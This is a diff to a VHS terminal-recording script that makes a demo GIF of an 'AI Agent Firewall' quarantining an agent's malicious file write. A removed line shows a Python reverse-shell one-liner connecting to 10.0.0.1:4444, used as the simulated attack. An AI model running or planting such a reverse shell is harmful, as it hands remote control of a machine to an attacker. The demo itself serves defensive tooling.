@@ -1,6 +1,6 @@
 # AI Agent Firewall - Automated Terminal GIF Generator
 # Requirements: brew install vhs
-# Usage: vhs demo.tape
+# Usage: cd ~/ai-agent-firewall && vhs demo.tape
 
 Output demo.gif
 
@@ -13,31 +13,28 @@ Set Padding 20
 Set Theme "Catppuccin Mocha"
 Set WindowBar "Colorful"
 Set BorderRadius 12
-Set TypingSpeed 50ms
+Set TypingSpeed 45ms
 
-# 1. Start the firewall inspector
-Type "aaf watch"
-Sleep 400ms
+# Clean previous test files silently
+Hide
+Type "rm -rf test_*.py .firewall-quarantine"
+Enter
+Show
+
+# 1. Run the agent under active firewall supervision
+Type "aaf run \"python demo_agent.py\""
+Sleep 500ms
+Enter
+Sleep 6s
+
+# 2. Verify in-place neutralization of the attack
+Type "cat test_backdoor.py"
+Sleep 500ms
 Enter
 Sleep 3s
 
-# 2. Simulate agent write interception
-Type "# In another process: Agent attempts reverse shell backdoor..."
-Sleep 1s
-Enter
-Type "echo 'import socket,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0)' > attack.py"
-Sleep 300ms
-Enter
-Sleep 4s
-
-# 3. Verify quarantine neutralization
-Type "cat attack.py"
-Sleep 300ms
-Enter
-Sleep 3s
-
-# 4. Show isolated threat in vault
-Type "cat .firewall-quarantine/attack.py.*.quarantine"
-Sleep 300ms
+# 3. Show isolated payload in the quarantine vault
+Type "cat .firewall-quarantine/test_backdoor.py.*.quarantine"
+Sleep 500ms
 Enter
 Sleep 4s
